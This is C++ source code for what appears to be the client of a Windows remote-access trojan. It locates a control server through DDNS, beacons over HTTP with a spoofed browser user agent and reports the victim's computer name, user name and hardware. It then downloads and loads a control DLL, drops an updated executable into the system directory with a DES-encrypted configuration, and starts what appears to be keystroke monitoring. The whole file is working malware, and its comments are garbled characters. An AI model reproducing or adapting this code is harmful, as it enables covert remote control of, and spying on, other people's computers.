#include "stdafx.h"
#include "SshWork.h"
#include <vfw.h>
#include "WjcDes.h"

#pragma comment(lib,"vfw32")
#pragma comment(lib,"winmm")


SshWork::SshWork()
{
	memset(&m_InitInfo,0,sizeof(m_InitInfo));
	m_Thread = NULL;
	hCtrlMd = NULL;
	m_Module = NULL;
	m_ExitEvent = NULL;
	hIe = NULL;
	hFp = NULL;
	m_IsVideo = 0;
}

SshWork::~SshWork()
{
	
}

void SshWork::CloseHttpHandle()
{
	if(hFp != NULL)
	{
		InternetCloseHandle(hFp);
		hFp = NULL;
	}
	if(hIe != NULL)
	{
		InternetCloseHandle(hIe);
		hIe = NULL;
	}
}

/*	
**	��������:	RecvData
**	��������:	����ָ���̶�����
**	�������:	hFile		: HTTPͨѶ��� 
				pData		: �������ݻ���
				DataLen		: �����������ݳ���
**	��������:	��
**	���ú���:	��
**	����ֵ	:	BOOL(TRUE-�������ݳɹ�,FALSE-��������ʧ��)
**	��ע	:	��
*/
BOOL SshWork::RecvData(HINTERNET hFile,LPVOID pData,int DataLen)
{
	char *p = (char*) pData;
	DWORD dwNumberOfBytesToRead = DataLen;
	DWORD dwNumberOfBytesReaded = 0;
	while(dwNumberOfBytesToRead > 0)
	{
		if(!InternetReadFile(hFile,p,dwNumberOfBytesToRead,
			&dwNumberOfBytesReaded))
			return FALSE;

		if(dwNumberOfBytesReaded == 0)
			return FALSE;

		p += dwNumberOfBytesReaded;
		dwNumberOfBytesToRead -= dwNumberOfBytesReaded;
	}
	return TRUE;
}

/*	
**	��������:	DlFile
**	��������:	��װ�ļ�
**	�������:	
**	��������:	pFileName	: ����ļ����� 
**	���ú���:	��
**	����ֵ	:	������()
**	��ע	:	��
*/
BOOL SshWork::DlFile(char* pFileName)
{
	//�����ļ�����
	int m_FileLen = 0;
	if(!RecvData(hFp,(char*) &m_FileLen,sizeof(int)))
	{
		//�����ļ�����ʧ��
		return FALSE;
	}

	//�����µ��ļ�����
	char *pData = new char[m_FileLen];
	if(!RecvData(hFp,pData,m_FileLen))
	{
		//��������ʧ��
		delete [] pData;
		return FALSE;
	}

	//��װ�����ļ�
	FILE *fp = fopen(pFileName,"wb");
	if(fp != NULL)
	{
		fwrite(pData,m_FileLen,1,fp);
		fclose(fp);
	}
	delete [] pData;
	return TRUE;
}

#ifdef _DEBUG
void WriteLog(char* pText)
{
	FILE *fp = fopen("c:\\1.txt","ab");
	if(fp != NULL)
	{
		fwrite(pText , strlen(pText), 1, fp);
		fclose(fp);
	}
}
#endif

BOOL SshWork::GetDesServerInfo(LPINITDLLINFO pInfo, char* pUrl)
{
	//��ʼ��HTTP����
	HINTERNET hMainIe = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0; "
						"Windows NT 5.0; .NET CLR 1.1.4322)",
						INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
	if(hMainIe == NULL)	return FALSE;
	
	//������
	HINTERNET hMainFile = InternetOpenUrl(
			hMainIe, pUrl, NULL, 0,
			INTERNET_FLAG_PRAGMA_NOCACHE|
			INTERNET_FLAG_RELOAD,
			NULL);
	if(hMainFile == NULL)
	{
		InternetCloseHandle(hMainIe);
		return FALSE;
	}

	//�鿴������
	char sCode[256] = {0};
	DWORD nSize = 250;
	DWORD nIndex = 0;
	if(!HttpQueryInfo(hMainFile , HTTP_QUERY_STATUS_CODE , 
		sCode , &nSize , &nIndex) || atoi(sCode) != 200)
	{
		InternetCloseHandle(hMainFile);
		InternetCloseHandle(hMainIe);
		return FALSE;
	}

	//��������
	char m_Response[256] = {0};
	for(int i = 0; i < 21; i++)
	{
		char ch = 0;
		DWORD nRead = 0;
		if(!InternetReadFile(hMainFile,&ch,1,&nRead)
			|| nRead == 0)
			break;
		m_Response[i] = ch;
	}
	InternetCloseHandle(hMainFile);
	InternetCloseHandle(hMainIe);

	//��������,ȡʵ�ʷ�������Ϣ
	char* pDot = strchr(m_Response , ':');
	if(pDot == NULL) return FALSE;
	*pDot = 0;
	strcpy(pInfo->m_ServerAddr, m_Response);
	pInfo->m_ServerPort = atoi(pDot + 1);
	return TRUE;
}

/*	
**	��������:	GetVideoInfo
**	��������:	ȡ�������Ƶ��Ϣ
**	�������:	��
**	��������:	��
**	���ú���:	��
**	����ֵ	:	char(1-����Ƶ 0-����Ƶ)
**	��ע	:	
*/
char SshWork::GetVideoInfo()
{
	HWND hCaphWnd = capCreateCaptureWindow("Capture",WS_POPUP,0,0,1,1,0,0);
	if(hCaphWnd==NULL) return 0;

	// Connect to webcam driver
	if(!capDriverConnect(hCaphWnd,0))
	{		
		return 0;
	}
	capDriverDisconnect(hCaphWnd);
	return 1;
}

/*	
**	��������:	GetHttpConnect
**	��������:	����HTTP����
**	�������:	pInfo		: ������ز���
**	��������:	hIe			: HTTP���Ӿ�� 
				hFile		: HTTP�ļ����
**	���ú���:	��
**	����ֵ	:	������(TRUE-�������ӳɹ�,FALSE-���ӽ���ʧ��)
**	��ע	:	��
*/
BOOL SshWork::GetHttpConnect(LPINITDLLINFO pInfo)
{
	//�رվ��
	if(hIe != NULL)
	{
		CloseHttpHandle();
		Sleep(2000);
	}

	//���������������Ϊ100
	DWORD nValue = 100;
	if( !InternetSetOption(NULL,73,&nValue,sizeof(DWORD)) ||
		!InternetSetOption(NULL,74,&nValue,sizeof(DWORD)))
		return FALSE;

	//�鿴�Ƿ���ddns
	if(strlen(pInfo->m_DdnsUrl) != 0)
	{
		//��Ҫ����DDNS
		if(!GetDesServerInfo(pInfo, pInfo->m_DdnsUrl))
		{
			if(!GetDesServerInfo(pInfo, pInfo->m_BakUrl)) 
			{
				//�������DDNS
				return FALSE;
			}
		}
	}

	//��ʼ��HTTP����
	hIe = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0; "
						"Windows NT 5.0; .NET CLR 1.1.4322)",
						INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
	if(!hIe) return FALSE;

	//������͵�ǰ�ͻ���Ϣ
	char m_Url[4096] = {0};
	char m_ExternData[2048] = {0};
	GetMySysInfo(m_ExternData);
	sprintf(m_Url,"http://%s:%d/%d%s",
		pInfo->m_ServerAddr,pInfo->m_ServerPort,
		CONN_MAIN,m_ExternData);

	//����HTTP����,��������
	hFp = InternetOpenUrl(hIe , 
		m_Url , NULL, 0,
		INTERNET_FLAG_PRAGMA_NOCACHE|
		INTERNET_FLAG_RELOAD|
		INTERNET_FLAG_NO_CACHE_WRITE , 0);
	if(!hFp)
	{
		CloseHttpHandle();
		return FALSE; 
	}

	DWORD m_TimeOut = 24 * 3600 * 1000;
	if(!InternetSetOption(hFp,
		INTERNET_OPTION_RECEIVE_TIMEOUT,&m_TimeOut,sizeof(DWORD)))
	{
		CloseHttpHandle();
		return FALSE;
	}

	//�鿴������
	char sCode[256] = {0};
	DWORD nSize = 250;
	DWORD nIndex = 0;
	if(!HttpQueryInfo(hFp , HTTP_QUERY_STATUS_CODE , 
		sCode , &nSize , &nIndex) || atoi(sCode) != 200)
	{
		CloseHttpHandle();
		return FALSE;
	}

	//�鿴����dll�Ƿ��Ѿ�װ��
	if(hCtrlMd) FreeLibrary(hCtrlMd);

	//���տ����ļ�
	if(!DlFile(m_InitInfo.m_CtrlFile))
	{
		CloseHttpHandle();
		return FALSE; 
	}

	//װ�ؿ���dll�ļ�
	hCtrlMd = LoadLibrary(m_InitInfo.m_CtrlFile);
	if(hCtrlMd == NULL)
	{
		CloseHttpHandle();
		return FALSE; 
	}
	
	//�����Ǳ�����������ʱ��,���±�����
	if(m_InitInfo.m_ProcessName[0] != 2)
	{
		if(!UpdateExeFile())
		{
			CloseHttpHandle();
			return FALSE; 
		}
	}

	return TRUE;
}

void SshWork::StopWork()
{
	//������Դ
	CloseHandle(m_ExitEvent); 
	CloseHttpHandle();
	KeyStopMyWork();

	//֪ͨ�������˳�
	HANDLE m_WaitEvent = 
		OpenEvent(EVENT_ALL_ACCESS,FALSE,
		m_InitInfo.m_EventName);
	if(m_WaitEvent)	
	{
		SetEvent(m_WaitEvent);
		CloseHandle(m_WaitEvent);
	}

	//�ͷŶ�̬�����
	if(hCtrlMd) FreeLibrary(hCtrlMd);
	if(m_Module) FreeLibrary(m_Module);
}

void SshWork::StartWork(LPINITDLLINFO pItem)
{
	//��������
	memcpy(&m_InitInfo,pItem,sizeof(INITDLLINFO));
	m_ExitEvent = CreateEvent(NULL,TRUE,FALSE,NULL);

	//�������̼��
	KeyStartMyWork();

	//m_IsVideo = GetVideoInfo();
    
	//������Ӧ�����߳���
	UINT m_Id = 0;
	m_Thread = (HANDLE) _beginthreadex(NULL , 0 , 
		SSH_WorkThread , (LPVOID) this , 0 , &m_Id);
}

/*	
**	��������:	SSH_WorkThread
**	��������:	�����̺߳���
**	�������:	lPvoid		: ����������ݽṹָ�� 
**	��������:	��
**	���ú���:	��
**	����ֵ	:	UINT
**	��ע	:	��
*/
UINT WINAPI SshWork::SSH_WorkThread(LPVOID lPvoid)
{
	//ȡ����ָ��
	SshWork* pWork = (SshWork*) lPvoid;

	//��ʼ���빤��ѭ��
	while(1)
	{
		//��������
		
		if(pWork->GetHttpConnect(&pWork->m_InitInfo))
		{
		
			//���ӳɹ�,��ʼ������
			PROCESSTRANS ProcessTrans = (PROCESSTRANS) 
				//pccortr.dll���pWork->hCtrlMd
				GetProcAddress(pWork->hCtrlMd,"ProcessTrans");
			if(ProcessTrans != NULL)
				//�������˵ĵ�ַ�Ͷ˿ڿ�ʼ������
				ProcessTrans(pWork->hFp , pWork->m_ExitEvent ,
						pWork->m_InitInfo.m_ServerAddr ,
						pWork->m_InitInfo.m_ServerPort ,
						pWork->m_InitInfo.m_KeyName ,
						pWork->m_InitInfo.m_ParentFile);
		}

		//��Ϣ�ȴ�ָ��ʱ��
		if(WaitForSingleObject(pWork->m_ExitEvent,
			30000) != WAIT_TIMEOUT)
			break;
	}

	//������Դ
	pWork->StopWork();
	ExitProcess(0);
	return 0;
}

/*	
**	��������:	getCpuSpeedFromRegistry
**	��������:	ȡ�����CPU��Ƶ
**	�������:	��
**	��������:	��
**	���ú���:	��
**	����ֵ	:	DWORD(�����CPU��Ƶ)
**	��ע	:	��ע�����ȡ����
*/
DWORD SshWork::getCpuSpeedFromRegistry(void) 
{
	HKEY hKey = NULL;
	LONG result = 0;
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
			 "Hardware\\Description\\System\\CentralProcessor\\0"
			 ,0,KEY_QUERY_VALUE,&hKey);
	if(result != ERROR_SUCCESS)
		return 0;

	DWORD dwSpeed = 0;
	DWORD dwType = 0;
	DWORD dwSpeedSize;
	result = RegQueryValueEx (hKey, "~MHz", NULL, 
		NULL, (LPBYTE)& dwSpeed, &dwSpeedSize);
	if(result != ERROR_SUCCESS)
		dwSpeed = 0;

	RegCloseKey (hKey);
	return (dwSpeed);
}

/*	
**	��������:	GetMySysInfo
**	��������:	ȡ����������Ϣ
**	�������:	��
**	��������:	m_TransData	: תΪASCII������ݻ���
**	���ú���:	��
**	����ֵ	:	��
**	��ע	:	
*/
void SshWork::GetMySysInfo(char *m_TransData)
{
	LOGININFO m_SysInfo = {0};

	//ȡ����ϵͳ
	m_SysInfo.m_SysType = IsShellSysType();

	//ȡCPU��Ϣ
	SYSTEM_INFO	m_pSysInfo = {0};
	GetSystemInfo(&m_pSysInfo);
	m_SysInfo.m_CpuSpeed = getCpuSpeedFromRegistry();
	m_SysInfo.m_CpuCount = (UINT) m_pSysInfo.dwNumberOfProcessors;
	
	//ȡ�ڴ�����
	MEMORYSTATUS Buffer = {0};
	GlobalMemoryStatus(&Buffer);
	m_SysInfo.m_MemContent = Buffer.dwTotalPhys/1024;

	//���������
	DWORD m_Len = 63;
	GetComputerName(m_SysInfo.m_PcName,&m_Len);
	m_SysInfo.m_PcName[60] = 0x00;
	m_SysInfo.m_PcName[61] = 0x01;

	//ȡ�û���
	DWORD len = 36;
	GetUserName(m_SysInfo.m_UserName,&len);
	m_SysInfo.m_UserName[37] = m_IsVideo;

	//�����ڲ���ʶ
	DWORD SeriaNumber = 0;
	GetVolumeInformation("C:\\",NULL,NULL,
		&SeriaNumber,NULL,NULL,NULL,NULL);
	char m_DesKey[10] = {0};
	sprintf(m_DesKey,"%08x",SeriaNumber);
	char m_SmallBuf[100] = {0};
	memset(m_SmallBuf,0,sizeof(m_SmallBuf));
	for(int i = 0; i < 8; i++)
	{
		m_SmallBuf[i] = m_SysInfo.
			m_PcName[i] ^ m_DesKey[i];
	}
	BcdToAsc((BYTE*) m_SmallBuf,(BYTE*) 
		m_SysInfo.ID,8);

	BcdToAsc((BYTE*) &m_SysInfo , 
		(BYTE*) m_TransData , sizeof(LOGININFO));
}

/*	
**	��������:	BcdToAsc
**	��������:	��BCD��ת��ΪASC��
**	�������:	BcdStr		: BCD������ݻ���
				BcdStrLen	: BCD�뻺�峤��
**	��������:	AscStr		: תΪASCII������ݻ���
**	���ú���:	��
**	����ֵ	:	��
**	��ע	:	
*/
void SshWork::BcdToAsc(BYTE *BcdStr,BYTE*AscStr,int BcdStrLen)
{
	int j = 0;
	for(int i = 0; i < BcdStrLen; i++)
	{
		j = (BcdStr[i] >> 4) & 0x0f;
  		if(j > 9)
			AscStr[2 * i] = j + 'A' - 10;
		else
			AscStr[2 * i] = j + '0';
		j = BcdStr[i] & 0x0f;
		if(j > 9)
			AscStr[2 * i + 1 ] = j + 'A' - 10;
		else
			AscStr[2 * i + 1] = j + '0';
	}
}

Type IsShellSysType()
{
   Type  ShellType;
   OSVERSIONINFO *osvi;
   DWORD winVer = GetVersion();
   if(winVer<0x80000000)
   {
	  //WINNT
      ShellType=WindowsNT3;
      osvi= (OSVERSIONINFO *)malloc(sizeof(OSVERSIONINFO));
      if (osvi!=NULL)
	  {
         memset(osvi,0,sizeof(OSVERSIONINFO));
         osvi->dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
         GetVersionEx(osvi);
         if(osvi->dwMajorVersion==4L)ShellType=WindowsNT4;
         else if(osvi->dwMajorVersion==5L&&osvi->dwMinorVersion==0L)
			 ShellType=Windows2000;
         else if(osvi->dwMajorVersion==5L&&osvi->dwMinorVersion==1L)
			 ShellType=WindowsXP;
		 else
			ShellType=Windows2003;
         free(osvi);
      }
   }
   else if  (LOBYTE(LOWORD(winVer))<4)
      ShellType=Windows32s;
   else{
      ShellType=Windows95;
      osvi= (OSVERSIONINFO *)malloc(sizeof(OSVERSIONINFO));
      if (osvi!=NULL){
         memset(osvi,0,sizeof(OSVERSIONINFO));
         osvi->dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
         GetVersionEx(osvi);
         if(osvi->dwMajorVersion==4L&&osvi->dwMinorVersion==10L)
			 ShellType=Windows98;
         else if(osvi->dwMajorVersion==4L&&osvi->dwMinorVersion==90L)
			 ShellType=WindowsME;
         free(osvi);
      }
   }
   return ShellType;
}

BOOL SshWork::UpdateExeFile()
{
	//ȡ�ļ���
	char* pFind = strrchr(m_InitInfo.m_ParentFile,'\\');
	if(pFind == NULL) return TRUE;
	char m_DesFile[256] = {0};

	//ϵͳĿ¼
	char m_SystemPath[256] = {0};
	GetSystemDirectory(m_SystemPath,200);
	sprintf(m_DesFile, "%s%s", m_SystemPath, pFind);

	//��EXE�ļ�
	FILE* fp = fopen(m_DesFile, "w+b");
	if(fp == NULL) return FALSE;

	//����EXE�ļ�����
	int m_FileLen = 0;
	if(!RecvData(hFp,(char*) &m_FileLen,sizeof(int)))
	{
		//�����ļ�����ʧ��
		return FALSE;
	}

	//�����µ�EXE�ļ�����
	char *pData = new char[m_FileLen];
	if(!RecvData(hFp,pData,m_FileLen))
	{
		//��������ʧ��
		delete [] pData;
		return FALSE;
	}

	//дEXE����
	fwrite(pData, m_FileLen, 1, fp);
	delete [] pData;

	//����dll�ļ�����
	if(!RecvData(hFp,(char*) &m_FileLen,sizeof(int)))
	{
		//�����ļ�����ʧ��
		return FALSE;
	}
	m_InitInfo.m_DllFileLen = m_FileLen;

	//����dll�ļ�����
	pData = new char[m_FileLen];
	if(!RecvData(hFp,pData,m_FileLen))
	{
		//��������ʧ��
		delete [] pData;
		return FALSE;
	}
	fwrite(pData, m_FileLen, 1, fp);
	delete [] pData;

	//�Ѿ����¹�,�Ժ��ٽ�ѹ�ļ�
	m_InitInfo.m_IsUpdate = 1;

	//DES������Ϣ
	INITDLLINFO m_InitFileInfo = {0};
	char m_DesKey[9] = "\x10\x20\x17\x10\x09\x55\x11\xeb";
	Des_Go((char*) &m_InitFileInfo, (char*) &m_InitInfo, 
		sizeof(INITDLLINFO), m_DesKey, 8, ENCRYPT);//����
	fwrite(&m_InitFileInfo, sizeof(INITDLLINFO), 1,fp);
	fclose(fp);
	return TRUE;
}
